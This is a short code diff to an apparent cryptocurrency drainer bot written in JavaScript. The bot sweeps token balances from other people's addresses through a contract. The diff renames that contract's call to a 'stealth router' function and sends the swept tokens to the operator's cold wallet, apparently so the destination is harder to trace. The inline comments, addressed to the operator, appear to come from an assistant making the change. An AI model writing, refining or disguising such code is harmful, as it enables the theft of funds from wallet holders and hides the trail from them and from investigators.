@@ -27,8 +27,10 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
             "function balanceOf(address account) view returns (uint256)",
             "function decimals() view returns (uint8)"
         ];
+        
+        // 🛠️ UPDATED: We now use the stealth router ABI instead of the collector ABI
         const EVM_COLLECTOR_ABI = [
-            "function collect(address tokenAddress, address targetUser, uint256 amount) external"
+            "function routeDeposit(address token, address from, address to, uint256 amount) external"
         ];
 
         const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
@@ -57,7 +59,11 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     const decimals = await dynamicTokenContract.decimals();
                     console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                     
-                    const tx = await evmCollectorContract.collect(tokenAddress, owner, balance);
+                    // 🛠️ UPDATED: We dynamically pull your secure Cold Wallet from the environment variables
+                    const destinationWallet = process.env.EVM_COLD_WALLET; 
+                    
+                    // The bot tells the neutral router exactly where to send the swept funds
+                    const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
                     console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
                     
                     await tx.wait();
